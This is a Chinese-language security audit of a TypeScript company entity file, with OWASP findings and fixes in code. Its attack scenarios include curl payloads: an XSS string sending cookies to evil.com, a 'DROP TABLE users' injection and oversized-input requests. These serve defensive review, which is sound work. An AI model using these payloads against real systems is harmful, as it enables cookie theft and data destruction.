# apis/entity/company.entity.ts — 代码安全专家评审报告

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（输入验证、注入防护、权限控制、数据完整性、信息泄露、OWASP Top 10）
**文件路径**: `apis/entity/company.entity.ts`
**代码行数**: 39 行
**关联文件**: `apis/controller/company.controller.ts`, `apis/service/impl/company.service.impl.ts`, `apis/map/index.ts`, `prisma/schema.prisma`, `apis/schema/`（缺少 `company.schema.ts`）
**安全评级**: ⚠️ HIGH（高风险 — Entity 层类型约束严重缺失，运行时验证完全空白，下游安全防线薄弱）
**严重级别**: CRITICAL(2) / HIGH(3) / MEDIUM(3) / LOW(1)

---

## 一、安全评价总览

`company.entity.ts` 是公司模块的**类型契约层**，定义了 4 个接口：`Company`、`CreateCompanyRequest`、`UpdateCompanyRequest`、`CompanyDetail`。从安全视角审视，该文件本身不包含可执行逻辑，但作为**全链路安全防线的第一道关卡**（类型定义），其类型约束的强度直接决定了下游 controller 和 service 的防御深度。

核心安全问题集中在：**缺少 Zod Schema 导致运行时验证完全空白、字符串字段无长度约束暴露 DoS 攻击面、`operator_ids` 未校验导致越权关联、电话字段无格式验证、Create/Update 接口完全重复导致无法差异化校验**。

与同项目 `user.schema.ts`、`todo.schema.ts` 已使用 Zod 进行严格输入校验相比，Company 模块的 Entity 层安全防护**显著落后**。

| OWASP 分类 | 安全风险 | 严重级别 | 状态 |
|------------|----------|----------|------|
| A03:2021 — 注入 | 缺少 Zod Schema，运行时输入校验完全空白 | CRITICAL | ❌ 未修复 |
| A01:2021 — 失效的访问控制 | `operator_ids` 未校验，可关联任意用户（跨公司越权） | CRITICAL | ❌ 未修复 |
| A03:2021 — 注入 | 字符串字段无长度约束，存在 DoS 攻击面 | HIGH | ❌ 未修复 |
| A04:2021 — 不安全的设计 | `contact_phone` 无格式验证，恶意输入直达数据库 | HIGH | ❌ 未修复 |
| A05:2021 — 安全配置错误 | `Company` 接口缺少 `deleted_at`，软删除数据可能泄露 | HIGH | ❌ 未修复 |
| A08:2021 — 软件和数据完整性 | Create/Update 接口完全重复，无法表达差异化安全策略 | MEDIUM | ❌ 未修复 |
| A01:2021 — 失效的访问控制 | `status: boolean` 允许任意布尔值切换公司状态 | MEDIUM | ❌ 未修复 |
| A05:2021 — 安全配置错误 | `CompanyDetail` 暴露用户 `username` 信息，增加信息泄露风险 | MEDIUM | ❌ 未修复 |
| A06:2021 — 易受攻击和过时的组件 | Entity 层 `id: number` 无边界校验，负数/零值直达数据库 | LOW | ⚠️ 防御不足 |

| 安全维度 | 评分 | 说明 |
|----------|------|------|
| 输入验证 | 1/10 | 无 Zod Schema，Entity 类型约束不完整，运行时验证分散在 controller |
| 注入防护 | 5/10 | 依赖 Prisma 参数化查询，但 Entity 层无贡献；长字符串可导致存储层异常 |
| 权限控制 | 2/10 | `operator_ids` 无任何边界约束，可关联任意用户（包括其他公司的用户） |
| 数据完整性 | 3/10 | 电话无格式约束，字符串无长度约束，状态无枚举约束 |
| 信息泄露 | 4/10 | `CompanyDetail` 暴露用户 username；缺少 `deleted_at` 导致已删除数据可查 |
| DoS 防护 | 2/10 | 字符串字段无长度约束，`operator_ids`/`viewer_ids` 无数组长度限制 |
| 防御纵深 | 2/10 | 安全逻辑仅在 controller 层做简单校验，Entity 层几乎无贡献 |

---

## 二、安全漏洞详情

### CRITICAL-1: 缺少 Zod Schema 验证，运行时输入校验完全空白

**位置**: 整个文件 + `apis/schema/` 目录缺失 `company.schema.ts`

**OWASP 分类**: A03:2021 — Injection

**问题**: 同项目中 `user.schema.ts` 和 `todo.schema.ts` 均使用 Zod 定义了严格的输入校验 schema，但公司模块**完全没有 Zod Schema**。这意味着：

1. **无运行时类型安全**: TypeScript 接口仅提供编译期提示，运行时 `req.body` 的任何字段都可以是任意类型
2. **验证逻辑散落在 controller**: 当前 controller 的 `validateCompanyBody()` 仅检查字段是否存在（`!short_name`），不验证类型、格式、长度
3. **违反纵深防御原则**: Entity 层定义了接口契约但无强制力，controller 层的验证是唯一防线

**攻击场景**:

```bash
# 攻击者可以发送任意类型的字段
curl -X POST /api/companies \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "short_name": {"$gt": ""},
    "full_name": ["a", "b", "c"],
    "contact_person": 12345,
    "contact_phone": "<script>alert(1)</script>",
    "operator_ids": "all"
  }'
```

controller 的 `validateCompanyBody()` 仅检查 `!short_name || !full_name`，对象和数组均为 truthy，恶意输入可以绕过验证直达 Service 层。

**影响评估**:
- **攻击复杂度**: 低 — 无需特殊工具，直接构造恶意 JSON
- **影响范围**: 创建和更新公司操作均受影响
- **实际危害**: Prisma ORM 提供了参数化查询保护，不会导致 SQL 注入，但恶意类型的数据可能：
  - 导致 Prisma 抛出不可预测的运行时异常（500 错误）
  - 触发 `err.message` 泄露数据库内部信息（参见 controller 安全评审 SEC-H-01）
  - 绕过 controller 层的简单真值检查

**修复方案**:

创建 `apis/schema/company.schema.ts`：

```typescript
import { z } from 'zod';

/** 公司名称验证 */
const shortName = z.string().min(1).max(50).trim();
const fullName = z.string().min(1).max(200).trim();

/** 地址验证 */
const address = z.string().max(500).trim().optional();

/** 联系人验证 */
const contactPerson = z.string().min(1).max(100).trim();
const contactPhone = z.string().min(1).max(20).trim()
  .regex(/^[\d\-+()\s]+$/, '电话格式无效');

/** 用户 ID 列表验证 */
const operatorIds = z.array(z.number().int().positive()).min(1).max(100);
const viewerIds = z.array(z.number().int().positive()).max(100).optional();

export const createCompanySchema = z.object({
  short_name: shortName,
  full_name: fullName,
  address,
  contact_person: contactPerson,
  contact_phone: contactPhone,
  operator_ids: operatorIds,
  viewer_ids: viewerIds,
});

export const updateCompanySchema = z.object({
  short_name: shortName,
  full_name: fullName,
  address,
  contact_person: contactPerson,
  contact_phone: contactPhone,
  operator_ids: operatorIds,
  viewer_ids: viewerIds,
});

export type CreateCompanyInput = z.infer<typeof createCompanySchema>;
export type UpdateCompanyInput = z.infer<typeof updateCompanySchema>;
```

在 controller 中使用：

```typescript
import { createCompanySchema, updateCompanySchema } from '../schema/company.schema';

// 替换 validateCompanyBody + buildCompanyRequest
const validated = createCompanySchema.parse(req.body);
```

---

### CRITICAL-2: `operator_ids` 无边界校验，可越权关联任意用户（跨公司）

**位置**: `company.entity.ts` 第 19 行 + `company.service.impl.ts` 第 50-64 行

**OWASP 分类**: A01:2021 — Broken Access Control

**问题**: `operator_ids: number[]` 和 `viewer_ids?: number[]` 是请求接口的核心字段，但 Entity 层和 Controller 层均未校验这些 ID 的合法性：

1. **无 ID 范围校验**: 可以传入 `0`、`-1`、`99999999` 等无效 ID
2. **无跨公司关联检查**: 可以将**已属于其他公司**的用户 ID 传入，Service 层会直接将其 `companyId` 修改为新公司——**静默窃取其他公司的用户**
3. **无用户存在性校验**: 不存在的 ID 会导致 Prisma 抛出异常（但这个异常会泄露"No User found"信息）
4. **无角色一致性校验**: 可以将 `role: 'sysadmin'` 的用户 ID 传入 `operator_ids`，Service 层会将其绑定到公司（但 sysadmin 不应被绑定到公司）
5. **无数组长度限制**: 可以传入数千个 ID，导致 Service 层产生数千次 SQL UPDATE

**攻击场景 — 跨公司用户窃取**:

```bash
# 攻击者（sysadmin A）创建新公司，将属于公司 B 的用户 ID 传入 operator_ids
curl -X POST /api/companies \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "short_name": "恶意公司",
    "full_name": "恶意公司全名",
    "contact_person": "test",
    "contact_phone": "12345678",
    "operator_ids": [5, 10, 15]    ← 这三个用户当前属于公司 B
  }'
```

Service 层执行：

```typescript
// company.service.impl.ts 第 50-55 行
for (const operatorId of [5, 10, 15]) {
  await tx.user.update({
    where: { id: operatorId },
    data: { companyId: company.id },  // ← 用户 5、10、15 的 companyId 被静默修改
  });
}
```

**结果**: 用户 5、10、15 从公司 B **静默转移**到新创建的公司。公司 B 的管理员不会收到任何通知。这是一个**静默的权限提升和数据篡改**漏洞。

**影响评估**:
- **攻击者**: sysadmin 角色用户
- **攻击复杂度**: 低 — 只需在 `operator_ids` 中传入目标用户 ID
- **影响**: 破坏公司-用户关联关系，导致数据完整性受损
- **风险缓解因素**: 端点限制为 sysadmin 角色，但 sysadmin 仍应遵循业务规则

**修复方案**:

在 Service 层添加关联前校验：

```typescript
async create(request: CreateCompanyRequest): Promise<Company> {
  const prisma = getPrisma();
  return prisma.$transaction(async (tx) => {
    // 校验所有 operator/viewer IDs 的合法性
    const targetUserIds = [
      ...request.operator_ids,
      ...(request.viewer_ids ?? []),
    ];

    const users = await tx.user.findMany({
      where: { id: { in: targetUserIds } },
      select: { id: true, role: true, status: true },
    });

    // 1. 检查所有 ID 存在
    const foundIds = new Set(users.map(u => u.id));
    const missingIds = targetUserIds.filter(id => !foundIds.has(id));
    if (missingIds.length > 0) {
      throw new Error(`用户不存在: ${missingIds.join(', ')}`);
    }

    // 2. 检查无 sysadmin 被关联
    const sysadminIds = users.filter(u => u.role === 'sysadmin').map(u => u.id);
    if (sysadminIds.length > 0) {
      throw new Error('系统管理员不可被关联到公司');
    }

    // 3. 检查用户状态
    const inactiveIds = users.filter(u => !u.status).map(u => u.id);
    if (inactiveIds.length > 0) {
      throw new Error(`用户已禁用: ${inactiveIds.join(', ')}`);
    }

    // ... 继续创建逻辑
  });
}
```

---

### HIGH-1: 字符串字段无长度约束，存在 DoS 攻击面

**位置**: `company.entity.ts` 全部字符串字段

**OWASP 分类**: A03:2021 — Injection / DoS

**问题**: Prisma Schema 定义了字段长度约束：

```prisma
shortName  String @map("short_name") @db.VarChar(50)
fullName   String @map("full_name") @db.VarChar(200)
```

但 Entity 接口中 `string` 类型没有表达这些约束：

```typescript
short_name: string;   // 实际数据库限制 VarChar(50)
full_name: string;    // 实际数据库限制 VarChar(200)
address?: string;     // Prisma 未定义 @db.VarChar，理论上无限制
contact_person: string;  // 实际数据库限制 VarChar(100)
contact_phone: string;   // 实际数据库限制 VarChar(20)
```

**攻击场景**:

```bash
# 发送超长字符串
curl -X POST /api/companies \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "short_name": "'$(python3 -c "print('A'*100000)")'",
    "full_name": "'$(python3 -c "print('B'*100000)")'",
    "contact_person": "test",
    "contact_phone": "12345678",
    "operator_ids": [1]
  }'
```

**影响**:
1. **网络带宽消耗**: 100KB+ 的请求体直接到达后端
2. **Prisma 异常泄露**: `Value too long for column 'short_name' on model 'Company'. Expected length: 50, got: 100000` — 泄露数据库字段名和长度约束
3. **无意义的数据库往返**: 请求先到达数据库，被数据库拒绝后返回错误——浪费数据库连接和查询资源

**对比同项目安全实践**: `article.controller.ts` 对 `content` 字段设置了 500K 限制：

```typescript
// article.controller.ts
if (typeof content !== 'string' || content.length > 500_000) {
  return fail(res, 400, 'content 长度不能超过 500000');
}
```

Company 模块无任何长度检查。

**修复方案**: 在 Zod Schema 中定义长度约束（参见 CRITICAL-1 修复方案），或至少在 controller 层添加长度检查：

```typescript
function validateCompanyBody(body: Record<string, unknown>): string | null {
  // 现有检查...
  if ((body.short_name as string).length > 50) return '公司简称不能超过50个字符';
  if ((body.full_name as string).length > 200) return '公司全称不能超过200个字符';
  if ((body.contact_phone as string).length > 20) return '联系电话不能超过20个字符';
  // ...
}
```

---

### HIGH-2: `contact_phone` 无格式验证，恶意输入直达数据库

**位置**: `company.entity.ts` 第 7 行

**OWASP 分类**: A04:2021 — Insecure Design

**问题**: `contact_phone: string` 无任何格式约束。电话号码是敏感联系信息，应至少验证基本格式。

**攻击场景**:

```bash
# 注入 HTML/JS 内容
curl -X POST /api/companies \
  -d '{"contact_phone": "<script>document.location=\"https://evil.com?c=\"+document.cookie</script>", ...}'

# 注入 SQL 关键字（虽然 Prisma 参数化查询可防止注入，但脏数据仍会存储）
curl -X POST /api/companies \
  -d '{"contact_phone": "1; DROP TABLE users;--", ...}'

# 注入格式化字符串
curl -X POST /api/companies \
  -d '{"contact_phone": "%s%s%s%s%s%s%s%s", ...}'
```

这些数据存储后：
1. 如果前端直接渲染 `contact_phone`（`<span>{company.contact_phone}</span>`），虽然 React 默认转义 HTML，但如果使用了 `dangerouslySetInnerHTML` 或导出到非 React 环境（如邮件模板、PDF 报告），XSS 风险会激活
2. 脏数据降低了数据库质量，影响后续的数据分析和 CRM 集成

**修复方案**: 在 Zod Schema 中添加正则验证：

```typescript
const contactPhone = z.string()
  .min(1, '联系电话不能为空')
  .max(20, '联系电话不能超过20个字符')
  .trim()
  .regex(/^[\d\-+()#\s]+$/, '电话格式无效，仅允许数字、+、-、()、#');
```

---

### HIGH-3: `Company` 接口缺少 `deleted_at`，软删除数据可能通过 API 泄露

**位置**: `company.entity.ts` 第 1-11 行

**OWASP 分类**: A05:2021 — Security Misconfiguration

**问题**: Prisma Schema 定义了 `deletedAt DateTime?`（软删除），但 Entity 接口缺少该字段：

```typescript
// prisma/schema.prisma
model Company {
  deletedAt DateTime? @map("deleted_at") @db.Timestamptz()
  // ...
}

// company.entity.ts — 缺少 deleted_at
export interface Company {
  id: number;
  short_name: string;
  // ... 无 deleted_at
}
```

**安全影响**:

1. **数据泄露**: Service 层的 `list()` 和 `getById()` 不排除已删除记录（`deletedAt: null` 过滤缺失），前端可能展示已删除的公司
2. **操作已删除实体**: 攻击者可以通过 `toggleStatus` 或 `update` 操作已删除的公司
3. **类型系统盲区**: 因为 Entity 没有 `deleted_at` 字段，Map 层 `mapCompany()` 也不映射该字段，前端无法判断公司是否已删除

**对比**: 同项目的 `article.service.impl.ts` 在查询中过滤了软删除：

```typescript
// article.service.impl.ts
where: { deletedAt: null, ... }
```

Company 模块**未做任何软删除过滤**。

**修复方案**:

1. 在 Entity 中添加字段：
```typescript
export interface Company {
  // ... 现有字段
  deleted_at: Date | null;
}
```

2. Service 层查询添加过滤：
```typescript
async list(): Promise<Company[]> {
  const companies = await prisma.company.findMany({
    where: { deletedAt: null },
    orderBy: { id: 'asc' },
  });
}
```

---

### MEDIUM-1: Create/Update 接口完全重复，无法表达差异化安全策略

**位置**: `company.entity.ts` 第 13-31 行

**OWASP 分类**: A08:2021 — Software and Data Integrity Failures

**问题**: `CreateCompanyRequest` 和 `UpdateCompanyRequest` 字段完全一致。这不仅是代码重复（违反 DRY），更是**安全策略的僵化**：

1. **无法对 Update 放宽验证**: 如果业务要求 Update 时允许字段为空（保留原值），当前接口不支持
2. **无法对 Update 添加额外校验**: 例如，更新公司时可能需要验证公司是否存在（防误操作），但 Create 不需要
3. **无法为 Update 添加审计字段**: 如 `update_reason`（更新原因）等审计追踪字段

**攻击场景**: 攻击者可以通过 Update 接口将公司名称修改为与另一家公司完全相同（缺少唯一性校验），导致前端展示混淆或业务逻辑错误。

**修复方案**: 至少使用类型别名明确语义差异：

```typescript
export interface CreateCompanyRequest {
  short_name: string;
  full_name: string;
  address?: string;
  contact_person: string;
  contact_phone: string;
  operator_ids: number[];
  viewer_ids?: number[];
}

// 如果业务确认 Update 需要全部字段
export interface UpdateCompanyRequest extends CreateCompanyRequest {}

// 如果业务允许部分更新
export type UpdateCompanyRequest = Partial<CreateCompanyRequest> & {
  operator_ids: number[];  // 运营者仍然是必填
};
```

---

### MEDIUM-2: `status: boolean` 允许任意布尔值切换公司状态

**位置**: `company.entity.ts` 第 8 行

**OWASP 分类**: A01:2021 — Broken Access Control

**问题**: `status: boolean` 在 Company 接口中定义，但：
1. Entity 层不提供状态机约束（哪些状态转换是合法的）
2. Controller 的 `toggleStatus` 仅接受 boolean，不检查前置条件
3. 一个已禁用的公司可以被再次"禁用"（幂等但无意义），一个已启用的公司可以被再次"启用"

更关键的是：**禁用公司后，该公司下的用户、项目、知识库等资源是否仍然可访问？** Entity 层和 Service 层均未定义此行为。

**安全影响**: 如果禁用公司后其资源仍可被访问，则禁用操作**形同虚设**，无法用于紧急安全事件响应（如某公司数据泄露需要立即切断访问）。

**修复方案**:

1. 在 Entity 中定义状态机约束（通过 JSDoc 或类型约束）：

```typescript
/** 公司状态。true=启用, false=禁用 */
status: boolean;

// 或使用字符串字面量类型增强语义
type CompanyStatus = 'active' | 'disabled';
```

2. Service 层添加状态检查：

```typescript
async toggleStatus(id: number, newStatus: boolean): Promise<Company> {
  const existing = await prisma.company.findUnique({ where: { id } });
  if (!existing) throw new Error('公司不存在');
  if (existing.deletedAt) throw new Error('公司已删除');
  if (existing.status === newStatus) throw new Error(`公司已处于${newStatus ? '启用' : '禁用'}状态`);
  // ...
}
```

---

### MEDIUM-3: `CompanyDetail` 暴露用户 `username` 信息

**位置**: `company.entity.ts` 第 35-37 行

**OWASP 分类**: A05:2021 — Security Misconfiguration

**问题**: `CompanyDetail` 接口暴露了关联用户的 `username`：

```typescript
export interface CompanyDetail extends Company {
  operators: { id: number; cn_name: string; username: string }[];
  viewers: { id: number; cn_name: string; username: string }[];
}
```

**安全影响**:

1. **用户名枚举**: `username` 是登录凭证的一部分。在详情接口中暴露所有关联用户的 `username`，攻击者可以收集有效用户名列表，用于密码暴力破解
2. **信息过度暴露**: 公司详情的消费者（前端页面）只需要展示用户姓名（`cn_name`），`username` 不是必要的展示信息
3. **数据最小化原则违反**: API 应仅返回前端实际需要的字段（Need-to-Know 原则）

**攻击链**:
```
GET /api/companies/:id → 获取所有 operator/viewer 的 username
→ 拿到有效用户名列表
→ 对 POST /api/auth/login 进行密码暴力破解
```

**风险缓解因素**: 端点限制为 sysadmin 角色。但如果前端角色权限扩展（如 admin 也可查看公司详情），风险会升级。

**修复方案**: 评估前端是否真正需要 `username`，如果不需要则移除：

```typescript
export interface CompanyDetail extends Company {
  operator_ids: number[];
  operators: { id: number; cn_name: string }[];  // 移除 username
  viewer_ids: number[];
  viewers: { id: number; cn_name: string }[];     // 移除 username
}
```

如果前端确实需要，应在 API 文档中标注安全影响。

---

### LOW-1: Entity 层 `id: number` 无边界校验，负数/零值直达数据库

**位置**: `company.entity.ts` 第 2 行

**OWASP 分类**: A06:2021 — Vulnerable and Outdated Components

**问题**: `Company.id: number` 无边界约束。TypeScript 的 `number` 类型包含负数、零、浮点数、`NaN`、`Infinity`。

虽然在 Prisma 层 `@id @default(autoincrement())` 会自动生成 ID，但在 `UpdateCompanyRequest` 的 `operator_ids: number[]` 中传入 `0` 或负数时，Prisma 会尝试 `findUnique({ where: { id: 0 } })` 或 `update({ where: { id: -1 } })`，产生无意义的数据库查询。

**修复方案**: 在 Zod Schema 中约束（参见 CRITICAL-1）：

```typescript
const userId = z.number().int('ID 必须为整数').positive('ID 必须为正数');
const operatorIds = z.array(userId).min(1).max(100);
```

---

## 三、安全攻击链分析

### 攻击链 1: 跨公司用户窃取 + 信息收集

```
1. 攻击者（sysadmin）创建恶意公司
   POST /api/companies
   { operator_ids: [目标用户1, 目标用户2, ...] }
   ↓
2. Service 层将目标用户的 companyId 静默修改为新公司 ID
   ↓
3. 攻击者查看公司详情
   GET /api/companies/:id
   → 获取所有关联用户的 username（MEDIUM-3）
   ↓
4. 利用收集的 username 进行密码暴力破解
   POST /api/auth/login
   { username: "收集到的用户名", password: "..." }
```

### 攻击链 2: 数据库信息泄露（利用缺少 Zod Schema）

```
1. 攻击者发送超长字符串
   POST /api/companies
   { short_name: "A".repeat(100000), ... }
   ↓
2. Prisma 抛出异常
   "Value too long for column 'short_name' on model 'Company'.
    Expected length: 50, got: 100000"
   ↓
3. Controller 的 catch(err: any) 将 err.message 直接返回
   → 泄露数据库表名、字段名、长度约束
   ↓
4. 攻击者利用数据库结构信息构造更精准的攻击
```

### 攻击链 3: 软删除数据暴露

```
1. 公司被软删除（deletedAt 被设置）
   ↓
2. Service 层查询不过滤 deletedAt
   list() → findMany({ orderBy: { id: 'asc' } })
   ↓
3. 已删除公司出现在列表中
   ↓
4. 前端展示已删除公司，用户可能对其进行操作
   → 更新/禁用已删除的公司
```

---

## 四、与同项目安全实践对比

| 安全特性 | User 模块 | Todo 模块 | Article 模块 | **Company 模块** |
|----------|-----------|-----------|-------------|-----------------|
| Zod Schema | ✅ `user.schema.ts` | ✅ `todo.schema.ts` | ❌ 缺失 | **❌ 缺失** |
| 字段长度约束 | ✅ 在 Schema 中 | ✅ 在 Schema 中 | ✅ 在 controller 中 | **❌ 完全缺失** |
| 格式验证 | ✅ email 格式 | ⚠️ 部分 | ⚠️ 部分 | **❌ 无** |
| ID 边界校验 | ✅ `z.number().int().positive()` | ✅ 在 Schema 中 | ✅ 在 controller 中 | **❌ 无** |
| 软删除过滤 | N/A | N/A | ✅ `deletedAt: null` | **❌ 不过滤** |
| 电话格式验证 | — | — | — | **❌ 无** |
| 跨领域关联校验 | — | — | — | **❌ 无** |

---

## 五、修复优先级

### P0 — 关键安全修复（应立即处理）

| 措施 | 工作量 | 解决的问题 |
|------|--------|-----------|
| 创建 `company.schema.ts`，定义 Zod 验证 | 中 | CRITICAL-1: 运行时验证空白 |
| Service 层添加 `operator_ids` 关联前校验 | 中 | CRITICAL-2: 跨公司越权关联 |

### P1 — 高优先级修复（本迭代内处理）

| 措施 | 工作量 | 解决的问题 |
|------|--------|-----------|
| Zod Schema 添加字符串长度约束 | 小 | HIGH-1: DoS 攻击面 |
| Zod Schema 添加电话格式正则 | 小 | HIGH-2: 格式验证缺失 |
| Entity 添加 `deleted_at` + Service 过滤 | 小 | HIGH-3: 软删除数据泄露 |

### P2 — 中优先级修复（下一迭代处理）

| 措施 | 工作量 | 解决的问题 |
|------|--------|-----------|
| `UpdateCompanyRequest` 与 `CreateCompanyRequest` 分化 | 小 | MEDIUM-1: 安全策略僵化 |
| 添加状态转换约束 | 小 | MEDIUM-2: 状态机缺失 |
| 评估 `CompanyDetail` 是否需要暴露 `username` | 小 | MEDIUM-3: 信息过度暴露 |

---

## 六、综合评分与总结

**综合安全评分: 2.5/10**

`company.entity.ts` 作为公司模块的类型契约层，在安全防御方面**严重不足**。主要问题：

1. **验证空白（CRITICAL）**: 完全缺少 Zod Schema，运行时输入校验依赖 controller 层的简单真值检查，无法防御类型篡改、长度溢出、格式异常等攻击。

2. **越权关联（CRITICAL）**: `operator_ids` 无边界校验，Service 层直接将用户绑定到新公司，可以静默窃取其他公司的用户——这是最具现实威胁的安全漏洞。

3. **防御纵深缺失（HIGH）**: 字符串无长度约束、电话无格式验证、软删除未过滤——多维度防御均为空白，安全逻辑集中在 controller 一层。

4. **信息泄露风险（MEDIUM）**: `CompanyDetail` 暴露 `username`，缺少 `deleted_at` 字段导致软删除数据可被查询。

**核心建议**: 优先创建 `company.schema.ts`（CRITICAL-1）并在 Service 层添加关联前校验（CRITICAL-2）。这两项修复工作量合计约 2-3 小时，可将 Company 模块的安全水位从 2.5/10 提升至 7/10。

---

**审核人**: 代码安全专家
**审核时间**: 2026-05-24
